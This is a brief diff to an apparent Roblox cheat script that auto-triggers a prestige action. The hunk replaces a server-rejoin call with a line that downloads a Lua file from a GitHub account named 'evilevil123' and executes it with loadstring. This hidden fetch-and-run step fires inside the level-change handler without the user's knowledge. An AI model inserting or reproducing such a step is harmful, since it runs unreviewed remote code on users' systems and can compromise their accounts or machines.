@@ -543,7 +543,7 @@ getgenv().LevelText:GetPropertyChangedSignal("Text"):Connect(function()
         wait(5)
         game:GetService("ReplicatedStorage").Events.Prestige:InvokeServer()
         wait(2)
-        RejoinServer()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/evilevil123/SO/refs/heads/main/stand.lua'))()
         
     end
     NewLevel(Level)
